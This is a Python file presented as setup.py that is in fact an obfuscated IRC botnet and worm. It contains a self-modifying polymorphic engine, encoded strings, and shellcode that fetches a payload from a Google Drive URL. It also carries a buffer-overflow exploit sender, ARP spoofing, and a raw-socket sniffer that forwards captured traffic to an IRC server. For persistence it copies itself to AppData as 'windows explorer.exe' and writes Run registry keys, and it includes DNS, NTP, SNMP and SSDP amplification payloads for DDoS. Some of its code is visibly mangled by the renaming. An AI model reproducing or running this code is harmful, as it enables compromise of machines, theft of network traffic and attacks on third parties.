#!/usr/bin/env python3
# coded by Freak - please leave credit if you use any of this code (especially polymorph engine)
# @setup.py
# coded by Freak - please leave credit if you use any of this code (especially polymorph engine)
import re,socket,subprocess,os,sys,urllib.request,urllib.parse,urllib.error,urllib.request,urllib.error,urllib.parse,ctypes,time,threading,random,itertools,platform,multiprocessing,select,ssl,struct,types,ast,zlib,ssl
from binascii import unhexlify
from base64 import b64decode
from uuid import getnode
from sys import argv
global AxDQkNcJaZ
global UoIKVSPkQuj
global awanviincf
global EahdvJPb
global hvILuyCcJxwi
global NTmcvowGB
global jFWEobahooKu
global HFpPabdolog
global XLEEwlclFd
global FxaVWiFiJH
global bJHNVcZc
global hVDRooIdLP
global command
hVDRooIdLP = "https://drive.google.com/uc?export=download&id=1bAx2n_db0GBiQ0M2maiTOqCazXZAhDRS"
def convert(value: bytes):
    return "{}".format(''.join(['\\x{:02x}'.format(c) for c in value]))

def wzihKxgDoV(s):
    doaoEciYQxoe = [65, 83, 98, 105, 114, 69, 35, 64, 115, 103, 71, 103, 98, 52]
    print(convert(s))
    dat=''.join([chr(c ^ doaoEciYQxoe[i % len(doaoEciYQxoe)]) for i, c in enumerate(s)])
    return dat
    f=open(__file__, "rb")
    data=f.read()
    f.close()
    print(b"wzihKxgDoV(zlib.decompress(b'" + convert(zlib.compress(s), 'utf-8') + bytes("'))", 'utf-8'))
    data = data.replace(b"wzihKxgDoV(zlib.decompress(b'" + bytes(convert(s), 'utf-8') + bytes("'))", 'utf-8'), bytes("\"" + dat.replace("\n", "\\n") + "\"", 'utf-8'))
    f=open(__file__, "wb")
    f.write(data)
    f.close()
    return dat

# Create an item structure for the header and oTRSmLSIaMM
class aRQLcFXm:
    def __init__(self, aQpboFVCc, name, HmClhocaa):
        self.type = aQpboFVCc
        self.name = name.encode()
        self.HmClhocaa = HmClhocaa
        self.name_size = 0x5
        self.HmClhocaa_size = 0x800

    def eiHQQUmXufv(self):
        return struct.eiHQQUmXufv('>III{}s{}s'.format(self.name_size, self.HmClhocaa_size),
                           self.type, self.name_size, self.HmClhocaa_size, self.name, self.HmClhocaa)

# Create a header structure
class PpTuCixFwcN:
    def __init__(self, hdr, oTRSmLSIaMM):
        self.hdr = hdr
        self.oTRSmLSIaMM = oTRSmLSIaMM
        self.pad = b'\x00' * (16 - (len(self.hdr) + len(self.oTRSmLSIaMM)) % 16)

    def eiHQQUmXufv(self):
        return b''.join([item.eiHQQUmXufv() for item in self.hdr]) + \
               b''.join([item.eiHQQUmXufv() for item in self.oTRSmLSIaMM]) + self.pad

# Create a preamble structure
class pJcaexLKTQou:
    def __init__(self, hp):
        self.msg_size = len(hp.eiHQQUmXufv()) + 16
        self.hdr_size = sum([len(item.eiHQQUmXufv()) for item in hp.hdr])
        self.oTRSmLSIaMM_size = sum([len(item.eiHQQUmXufv()) for item in hp.oTRSmLSIaMM])
        self.unk = 0  # Unknown HmClhocaa

    def eiHQQUmXufv(self):
        return struct.eiHQQUmXufv('>IIII', self.msg_size, self.hdr_size, self.oTRSmLSIaMM_size, self.unk)

# Create a message structure
class hPiZcgzYoWSn:
    def __init__(self, hp):
        self.pre = pJcaexLKTQou(hp)
        self.hdrpay = hp

    def eiHQQUmXufv(self):
        return self.pre.eiHQQUmXufv() + self.hdrpay.eiHQQUmXufv()



oHobzJhI =  "\x56\xe8\x00\x00\x53\x00\x56\x55\x8b\x57\x24\x6c\x8b\x18\x3c\x45\x54\x8b\x78\x05\xea\x01\x4a\x8b\x8b\x18\x20\x5a\xeb\x01\x32\xe3\x8b\x49\x8b\x34\xee\x01\xff\x31\x31\xfc\xac\xc0\xe0\x38\x07\x74\xcf\xc1\x01\x0d\xeb\xc7\x3b\xf2\x24\x7c\x75\x14\x8b\xe1\x24\x5a\xeb\x01\x8b\x66\x4b\x0c\x5a\x8b\x01\x1c\x8b\xeb\x8b\x04\xe8\x01\x02\xeb\xc0\x31\x5e\x5f\x5b\x5d\x08\xc2\x5e\x00\x30\x6a\x64\x59\x19\x8b\x5b\x8b\x8b\x0c\x1c\x5b\x1b\x8b\x5b\x8b\x53\x08\x8e\x68\x0e\x4e\xff\xec\x89\xd6\x53\xc7\x8e\x68\x0e\x4e\xff\xec\xeb\xd6\x5a\x50\xff\x52\x89\xd0\x52\xc2\x53\x52\xaa\x68\x0d\xfc\xff\x7c\x5a\xd6\x4d\xeb\x51\x59\xff\x52\xeb\xd0\x5a\x72\x5b\xeb\x6a\x59\x6a\x00\x51\x00\x6a\x52\xff\x00\x53\xd0\xa0\x68\xc9\xd5\xff\x4d\x5a\xd6\xff\x52\x53\xd0\x98\x68\x8a\xfe\xff\x0e\xeb\xd6\x59\x44\x00\x6a\xff\x51\x53\xd0\x7e\x68\xe2\xd8\xff\x73\x6a\xd6\xff\x00\xe8\xd0\xff\xab\xff\xff\x72\x75\x6d\x6c\x6e\x6f\x64\x2e\x6c\x6c\xe8\x00\xff\xae\xff\xff\x52\x55\x44\x4c\x77\x6f\x6c\x6e\x61\x6f\x54\x64\x46\x6f\x6c\x69\x41\x65\xe8\x00\xff\xa0\xff\xff\x2e\x2e\x64\x5c\xe8\x00\xff\xb7\xff\xff\x2e\x2e\x64\x5c\xe8\x00\xff\x89\xff\xff\x74\x68\x70\x74\x3a\x73\x2f\x2f\x72\x64\x76\x69\x2e\x65\x6f\x67\x67\x6f\x65\x6c\x63\x2e\x6d\x6f\x75\x2f\x3f\x63\x78\x65\x6f\x70\x74\x72\x64\x3d\x77\x6f\x6c\x6e\x61\x6f\x26\x64\x64\x69\x31\x3d\x41\x62\x32\x78\x5f\x6e\x62\x64\x47\x30\x69\x42\x30\x51\x32\x4d\x61\x6d\x54\x69\x71\x4f\x61\x43\x58\x7a\x41\x5a\x44\x68\x53\x52\x00\x00"
buf = b'90' * 340
buf += b'812b4100'
buf += b'90909090'
buf += b'90909090'
buf += oHobzJhI.encode("utf-8")
buf += b'41' * 80
buf += b'84d45200'
buf += b'43' * (0x800 - len(buf))

buf2 = b'41' * 0x1000

def STZoFYcU(host, port):
    try:
        # Create message exploit
        hdr = [aRQLcFXm(3, "pwned", buf)]
        oTRSmLSIaMM = [aRQLcFXm(3, "pwned", buf2)] # dummy oTRSmLSIaMM, probabaly not necessary
        NsaOwmKI = PpTuCixFwcN(hdr, oTRSmLSIaMM)
        LoBYRapuSFeB = hPiZcgzYoWSn(NsaOwmKI)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, port))
            s.sendall(LoBYRapuSFeB.eiHQQUmXufv())
            s.close()
    except:
        pass
# check for
EahdvJPb = 1
uTnUajaLEKlv = 0
yELscaVhUe = 1
TsHDsaOXY = 0
bJHNVcZc = "ntp"
NTmcvowGB=5
jFWEobahooKu=4
BsxFGPRogEX = 0
jmaoaichDJ = {}
FxaVWiFiJH = 1
awanviincf = []
AaKozzFxDU = {
    "dns": 53,
    "ntp": 123,
    "snmp": 161,
    "ssdp": 1900 }
CocMZFBnHq = {
    "dns": ('\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00'),
    "snmp":('\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00'),
    "ntp":('\x17\x00\x02\x2a'+'\x00'*4),
    "ssdp":('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\rn')
}
ZOzCsxfk = {
    "dns": {},
    "ntp": {},
    "snmp": {},
    "ssdp": {}
}

def annnaCuphvOX():
    myip = [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x2b\x48\x0c\x75\x07\x00\x03\xd8\x01\x6e')))][:1], [[(s.connect((wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\xac\x8d\x72\xf7\xca\x96\x06\x00\x0a\xf1\x02\x68')), 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]
    anpgEfua=[]
    fh=open(wzihKxgDoV(zlib.decompress(b'\x78\x9c\xcb\x53\x16\x60\x13\xcc\xf2\x55\x65\xf7\x50\x13\x15\x02\x00\x11\x06\x02\x31')), "rb")
    plscEfwS=fh.readlines()
    fh.close()
    plscEfwS.pop(0)
    for x in plscEfwS:
        x=x.split()
        if x[2]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\x2b\xd4\x0e\x00\x00\x01\xfc\x00\xed')):
            if x[0] != myip:
                anpgEfua.append((x[0], x[3]))
    return anpgEfua
def RYihomafiX():
    fYPMELiaFiqA = hex(getnode())[2:-1]
    while (len(fYPMELiaFiqA) != 12):
        fYPMELiaFiqA = "0" + fYPMELiaFiqA
    return unhexlify(fYPMELiaFiqA)
def ThIiaNDZSD():
    with open(wzihKxgDoV(zlib.decompress(b'\x78\x9c\xcb\x53\x16\x60\x13\xcc\xf2\x55\x65\xf7\x30\xe5\x10\x77\x50\x01\x00\x16\x32\x02\x9c')), "rb") as fh:
        for line in fh:
            qENSUbOcJf = line.strip().split()
            if qENSUbOcJf[1] != wzihKxgDoV(zlib.decompress(b'\x78\x9c\x2b\x4c\x0e\x8a\x74\x2a\x15\x2e\x00\x00\x0c\xeb\x02\xba')) or not int(qENSUbOcJf[3], 16) & 2:
                continue
            return socket.inet_ntoa(eiHQQUmXufv(wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\x95\x07\x00\x01\x1b\x00\x9d')), int(qENSUbOcJf[2], 16)))
def anpgEfua():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
    s.bind((wzihKxgDoV(zlib.decompress(b'\x78\x9c\x33\xb3\x67\x66\x77\x02\x00\x02\x68\x00\xc2')), 0))
    while(1):
        for ZxFKOBJav in annnaCuphvOX():
            LJampqfbe = RYihomafiX()
            HVQcChLnG = ZxFKOBJav[0]
            KdUimCuc = ThIiaNDZSD()
            znddSodZhmi = ZxFKOBJav[1]
            AUOZvvoha = "\x00\x00\x00\x00\x00\x00"
            BdcFjdBoZic = "\x00\x01\x08\x00\x06\x04\x00\x02"
            wHFyoIDjZ = "\x00\x00\x00\x00"
            uBGLYhhJa = "\x08\x06"
            s.send(HVQcChLnG + LJampqfbe + uBGLYhhJa + BdcFjdBoZic+LJampqfbe + KdUimCuc
                   + AUOZvvoha + znddSodZhmi + wHFyoIDjZ)
        time.sleep(2)
def XLiAoDIgHc():
    threading.Thread(target=fuKpCZcxj,args=()).start()
    while 1:
        try:
            SPWbDqHLW()
        except Exception as e:
            print(str(e))
def lIIxLNHT():
    if sys.executable.endswith(".exe"):
        return 1
    for i in range(0,7):
        try:
            pid = os.fork()
            if pid > 0:
                sys.exit(0)
        except OSError as err:
            return -1
    return 1
def GOIiuVbvWxE(data):
    s = 0
    n = len(data) % 2
    for i in range(0, len(data)-n, 2):
        s+= ord(data[i]) + (ord(data[i+1]) << 8)
    if n:
        s+= ord(data[i+1])
    while (s >> 16):
        s = (s & 0xFFFF) + (s >> 16)
    s = ~s & 0xffff
    return s
global chobJpTOevFk
chobJpTOevFk=__file__
ohuWokNS=open(chobJpTOevFk,"rb")
EsJoiTiIDK=ohuWokNS.read()
ohuWokNS.close()
class GGXifxZfa(ast.NodeVisitor):
    def ljJagaIyP(self, node):
        try:
            OaYgJDNak=EsJoiTiIDK.split("\n")[node.lineno-1]
            pQYYnXKyhal=OaYgJDNak[node.col_offset:node.col_offset+len(node.s)+2][0]
            xGMPljbZxCJ=eval(repr(pQYYnXKyhal + "".join(OaYgJDNak[node.col_offset+1:node.col_offset+len(node.s)+len(OaYgJDNak[node.col_offset-1:node.col_offset+len(node.s)+1].split(OaYgJDNak[node.col_offset+1:node.col_offset+len(node.s)+2][0])[0])+4][:OaYgJDNak[node.col_offset+1:node.col_offset+len(node.s)+len(OaYgJDNak[node.col_offset-1:node.col_offset+len(node.s)+2].split(OaYgJDNak[node.col_offset+1:node.col_offset+len(node.s)+2][0])[0])+4].find(pQYYnXKyhal)]) + pQYYnXKyhal))
            if len(xGMPljbZxCJ)>=jFWEobahooKu and xGMPljbZxCJ not in awanviincf:
                awanviincf.append(xGMPljbZxCJ)
        except Exception as e:
            print(str(e))
def DObNzVOv(s):
    ch = (ord(c) for c in s)
def nOhicxouNLp(poKdfamESH):
    return ''.join(random.choice("abcdefghijklmnopqoasadihcouvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(poKdfamESH))
def fuKpCZcxj():
    if sys.executable.endswith(".exe"):
        return 1
    AxDQkNcJaZ = []
    UoIKVSPkQuj = []
    XLEEwlclFd = []
    ohuWokNS=open(chobJpTOevFk,"rb")
    EsJoiTiIDK=hvILuyCcJxwi=ohuWokNS.read()
    ohuWokNS.close()
    p = ast.parse(EsJoiTiIDK)
    GGXifxZfa().visit(p)
    for woWHfvKX in sorted(awanviincf, key=len, reverse=True):
        hvILuyCcJxwi=hvILuyCcJxwi.replace(woWHfvKX, "wzihKxgDoV(zlib.decompress(b'"+DObNzVOv(zlib.compress(wzihKxgDoV(eval(woWHfvKX).decode('string_escape'))))+"'))")
    XLEEwlclFd = [node.name for node in ast.walk(p) if isinstance(node, ast.ClassDef)]
    AxDQkNcJaZ = sorted({node.id for node in ast.walk(p) if isinstance(node, ast.Name) and not isinstance(node.ctx, ast.Load)})
    for qjPmpSESoU in [n for n in p.body if isinstance(n, ast.FunctionDef)]:
        UoIKVSPkQuj.append(qjPmpSESoU.name)
    XLEEwlclFd = [node for node in ast.walk(p) if isinstance(node, ast.ClassDef)]
    for WoymCwTEBxaH in XLEEwlclFd:
        for qjPmpSESoU in [n for n in WoymCwTEBxaH.body if isinstance(n, ast.FunctionDef)]:
            if qjPmpSESoU.name != wzihKxgDoV(zlib.decompress(b'\x78\x9c\x93\xe3\xe1\x66\x97\x36\xac\x91\x07\x00\x03\xc7\x01\x24')) and qjPmpSESoU not in UoIKVSPkQuj:
                UoIKVSPkQuj.append(qjPmpSESoU.name)
    NQoahIQbsiH=[]
    alls=[]
    for i in range(len(UoIKVSPkQuj)+len(AxDQkNcJaZ)+len(XLEEwlclFd)):
        oGaeOglJhoc = nOhicxouNLp(random.randint(8,12))
        while oGaeOglJhoc in NQoahIQbsiH:
            oGaeOglJhoc = nOhicxouNLp(random.randint(8,12))
        NQoahIQbsiH.append(oGaeOglJhoc)
    BidpVKnMXcq=0
    for duavRYaSab in sorted(AxDQkNcJaZ, key=len, reverse=True):
        if len(duavRYaSab) >= NTmcvowGB and duavRYaSab != wzihKxgDoV(zlib.decompress(b'\x78\x9c\x33\x32\xe3\xe3\x07\x00\x01\x99\x00\x86')) and not duavRYaSab.startswith(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x93\xe3\x01\x00\x00\x4a\x00\x2b'))):
            hvILuyCcJxwi=hvILuyCcJxwi.replace(duavRYaSab, NQoahIQbsiH[BidpVKnMXcq])
        BidpVKnMXcq+=1
    for qjPmpSESoU in sorted(UoIKVSPkQuj, key=len, reverse=True):
        hvILuyCcJxwi=hvILuyCcJxwi.replace(qjPmpSESoU, NQoahIQbsiH[BidpVKnMXcq])
        BidpVKnMXcq+=1
    for WoymCwTEBxaH in XLEEwlclFd:
        alls.append(NQoahIQbsiH[BidpVKnMXcq])
        hvILuyCcJxwi=hvILuyCcJxwi.replace(WoymCwTEBxaH.name, NQoahIQbsiH[BidpVKnMXcq])
        BidpVKnMXcq+=1
    xTORIfLQJbF=open(chobJpTOevFk,"wb")
    xTORIfLQJbF.write(hvILuyCcJxwi)
    xTORIfLQJbF.close()
class KVZywAHcYcok(object):
    def __init__(self, TUySGnRCua, WEZbHXIhiBz, BdcFjdBoZic='', bJHNVcZc=socket.IPPROTO_TCP):
        self.tl = 20+len(BdcFjdBoZic)
        self.id = random.randint(0, 65535)
        self.DacxOTdJh = bJHNVcZc
        self.TUySGnRCua = socket.inet_aton(TUySGnRCua)
        self.WEZbHXIhiBz = socket.inet_aton(WEZbHXIhiBz)
    def wyxCFILoPV(self):
        adSRhKhpip = (4 << 4) + 5
        VaMcoWoSgmO = 0 << 13
        hfViUEKaxbu = eiHQQUmXufv(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x4b\x10\x54\x50\xb4\xe2\x4d\x64\xb2\x0e\x36\x09\x16\x04\x00\x11\x4e\x02\x83')),adSRhKhpip,0,self.tl,self.id,VaMcoWoSgmO,255,self.DacxOTdJh,2,self.TUySGnRCua,self.WEZbHXIhiBz)
        hfViUEKaxbu = eiHQQUmXufv(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x4b\x10\x54\x50\xb4\xe2\x4d\x64\xb2\x0e\x36\x09\x16\x04\x00\x11\x4e\x02\x83')),adSRhKhpip,0,self.tl,self.id,VaMcoWoSgmO,255,self.DacxOTdJh,socket.htons(GOIiuVbvWxE(hfViUEKaxbu)),self.TUySGnRCua,self.WEZbHXIhiBz)
        return hfViUEKaxbu
class pqQjdZVHTiTP(object):
    def __init__(self, TUySGnRCua, GEiiXcfOQ, BdcFjdBoZic=''):
        self.TUySGnRCua = TUySGnRCua
        self.GEiiXcfOQ = GEiiXcfOQ
        self.BdcFjdBoZic = BdcFjdBoZic
    def wyxCFILoPV(self, TUySGnRCua, GEiiXcfOQ, bJHNVcZc=socket.IPPROTO_UDP):
        doMPvanxMJ = self.doMPvanxMJ
        IVqMHaaJgi = eiHQQUmXufv(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x4b\x48\x17\x8c\x65\x64\x4f\xe4\x00\x00\x08\xf3\x01\xa7')),
            socket.inet_aton(TUySGnRCua), socket.inet_aton(GEiiXcfOQ), 0,
            bJHNVcZc, 8 + len(self.BdcFjdBoZic))
        self.GOIiuVbvWxE = GOIiuVbvWxE(IVqMHaaJgi)
        ivpBVLjA = eiHQQUmXufv(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x4b\x90\xd6\x52\xb4\x02\x00\x03\x4b\x01\x01')), self.TUySGnRCua, self.GEiiXcfOQ, 8 + len(self.BdcFjdBoZic), 0)
        return ivpBVLjA
class SPWbDqHLW():
    def JAEvehMiK(self,nODQlBcdebaC):
        global FxaVWiFiJH
        up = 0
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            TGaaomVdBi = fcntl.ioctl(s.fileno(  ), 0x8913, wzihKxgDoV(zlib.decompress(b'\x78\x9c\x33\xb3\x67\x66\x77\x02\x00\x02\x68\x00\xc2')) + wzihKxgDoV(zlib.decompress(b'\x78\x9c\x73\x04\x00\x00\x42\x00\x42'))*256)
            caaNdaoOR, = struct.uneiHQQUmXufv('H', TGaaomVdBi[16:18])
            up = caaNdaoOR & 1
        except:
            pass
        if up == 1:
            threading.Thread(target=anpgEfua,args=()).start()
        try:
            s=socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except:
            return
        afTXuSmclfMH = 0
        while True:
            if FxaVWiFiJH == 1:
                continue
            try:
                ivpBVLjA = s.recvfrom(65565)
                afTXuSmclfMH=afTXuSmclfMH+1
                ivpBVLjA=ivpBVLjA[0]
                MQoCuQHYR = 14
                aSBxfiTFO = ivpBVLjA[:MQoCuQHYR]
                eth_struct.uneiHQQUmXufv =  struct.uneiHQQUmXufv(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x4b\x48\x15\x8c\x67\xe4\x05\x00\x05\xaf\x01\x44')),aSBxfiTFO)
                mAJbBPyaxoUm = socket.ntohs(eth_struct.uneiHQQUmXufv[2])
                hfViUEKaxbu = ivpBVLjA[0:20]
                header_struct.uneiHQQUmXufved = struct.uneiHQQUmXufv(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x4b\x10\x54\x50\xb4\xe2\x4d\x64\xb2\x0e\x36\x09\x16\x04\x00\x11\x4e\x02\x83')),hfViUEKaxbu)
                FIDaAORygi= header_struct.uneiHQQUmXufved[0]
                uoiDKhmcdin = FIDaAORygi >> 4
                nhojKiRM = FIDaAORygi & 0xF *4
                JBRZsLow = header_struct.uneiHQQUmXufved[5]
                DacxOTdJh = header_struct.uneiHQQUmXufved[6]
                bEvROslL = socket.inet_ntoa(header_struct.uneiHQQUmXufved[8])
                JvsYTGGa = socket.inet_ntoa(header_struct.uneiHQQUmXufved[9])
                EURkZKBEVjZ = ivpBVLjA[nhojKiRM:nhojKiRM+20]
                tcph = struct.uneiHQQUmXufv(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x4b\x90\xd6\x52\xb5\x63\x4f\xe4\xb0\xd6\x07\x00\x0a\xe8\x01\xe3')),EURkZKBEVjZ)
                SIWvRXgGj = tcph[0]
                ukcjvhUhD = tcph[1]
                NacJaIHMvkd = tcph[2]
                hHdqiCSea = tcph[3]
                dXayKAhywIKY = tcph[4]
                lNbOeioMvp = dXayKAhywIKY >> 4
                WLMoCSPUxAY = nhojKiRM+lNbOeioMvp*4
                CwaVBLSudVT = len(ivpBVLjA)-WLMoCSPUxAY
                data = ivpBVLjA[WLMoCSPUxAY:]
                if len(data) > 2 and SIWvRXgGj!=1337 and SIWvRXgGj!=6667 and SIWvRXgGj!=23 and SIWvRXgGj!=443 and SIWvRXgGj!=37215 and SIWvRXgGj!=53 and SIWvRXgGj!=22 and ukcjvhUhD!=1337 and ukcjvhUhD!=6667 and ukcjvhUhD!=23 and ukcjvhUhD!=443 and ukcjvhUhD!=37215 and ukcjvhUhD!=53 and ukcjvhUhD!=22:
                    try:
                        ss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                        ss.connect((nODQlBcdebaC, 1337))
                        ss.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\xe3\x60\x16\x01\x00\x00\x35\x00\x20'))+str(uoiDKhmcdin)+ wzihKxgDoV(zlib.decompress(b'\x78\x9c\xf3\x66\x37\x53\xf5\x00\x00\x02\xcc\x00\xf6'))+str(JBRZsLow)+wzihKxgDoV(zlib.decompress(b'\x78\x9c\xf3\x66\x16\x60\x63\xd3\x72\xd0\x97\x8f\x05\x00\x06\xdb\x01\x80'))+str(DacxOTdJh)+wzihKxgDoV(zlib.decompress(b'\x78\x9c\xf3\x66\xe0\x95\x61\x50\x73\x4b\x30\x62\x56\x16\x65\x77\x37\xca\x04\x00\x13\x3e\x02\x97'))+str(bEvROslL)+wzihKxgDoV(zlib.decompress(b'\x78\x9c\xf3\x16\x67\x97\x62\xd3\xf1\x55\x64\xe7\xd3\xe0\x74\x2a\x55\x35\x17\xe0\x61\x34\x93\x04\x00\x20\x3c\x02\xe9'))+str(JvsYTGGa)+wzihKxgDoV(zlib.decompress(b'\x78\x9c\xf3\xae\xf3\x77\x89\xcf\xe0\xcb\x8d\xf3\xca\xf2\xf2\x97\xcc\xc1\xcb\xcb\x48\x56\xd4\x0a\x33\x12\x60\x4a\x37\xe7\x75\x33\xcd\x04\x00\x23\xef\x11\x92'))+str(SIWvRXgGj)+wzihKxgDoV(zlib.decompress(b'\x78\x9c\xf3\x16\x67\x97\x62\xd3\xf1\x55\x64\xe7\xd3\xe0\x74\x4a\xd1\x53\x14\x0b\x06\x00\x17\xc9\x02\xc8'))+str(ukcjvhUhD)+wzihKxgDoV(zlib.decompress(b'\x78\x9c\xf3\x2e\x70\xf4\x0a\x4c\x63\x48\x0e\x70\x49\x51\x55\x2f\xe6\x90\x55\xd3\x50\x63\x01\xf3\x5c\x1c\xc5\x93\xe0\x72\xbe\x00\xc7\x31\x0a\x04'))+data+wzihKxgDoV(zlib.decompress(b'\x78\x9c\xcb\xa9\xf3\x77\x89\xcf\xe0\xcb\x8d\xf3\xca\xf2\xf2\x97\xcc\xc1\xca\xab\xcc\x4d\x71\x71\x14\x4f\x2a\x70\xf4\x0a\x4c\x63\x60\xb5\x55\x66\x56\x33\x2b\x85\xf2\x92\x03\x5c\xe0\x72\xfe\x00\x9b\xa2\x17\x01')))
                        ss.close()
                    except:
                        pass
            except:
                pass
    def __init__(self):
        sys.stdout = sys.stderr = ssl.create_default_context()
        try:
            evil_file_location = os.environ["appdata"] + "\\windows explorer.exe"
            if not os.path.exists(evil_file_location):
                shutil.copyfile(sys.executable, evil_file_location)
                subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v test /t REG_SZ /d "' + evil_file_location + '"', shell=True)
                try:
                    is_admin = os.getuid() == 0
                except AttributeError:
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                if is_admin:
                    subprocess.call('reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v test /t REG_SZ /d "' + evil_file_location + '"', shell=True)
        except:
            pass
        self.ctx = ssl.create_default_context()
        self.ctx.check_hostname = False
        self.ctx.verify_mode = ssl.CERT_NONE
        self.VwkBkdwM=nOhicxouNLp(random.randrange(8,12))
        self.gLsaWmlh=0
        self.XUbvPqib=0
        self.scanThreads=220
        self.exploitstats={"default":[0,0]}
        self.YxqCRypO="irc.sorcery.net"
        threading.Thread(target=self.JAEvehMiK, args=(self.YxqCRypO,)).start()
        self.EQGAKLwR=6697
        self.lAyMzJrw="#darkirc_net"
        self.TbdfKqvM="swegfeg"
        self.hLqhZnCt="[HAX]|["+platform.system()+"]["+platform.machine()+"|"+str(multiprocessing.cpu_count())+"|"+str(self.VwkBkdwM)+"]"
        self.aRHRPteL="[HAX]-["+platform.system()+"]["+platform.machine()+"|"+str(multiprocessing.cpu_count())+"|"+str(self.VwkBkdwM)+"]"
        self.pBYbuWVq=str(self.VwkBkdwM)
        self.AELmEnMe=0
        self.GbASkEbE=["Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
        "Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
        "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6",
        "Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
        "Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
        "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
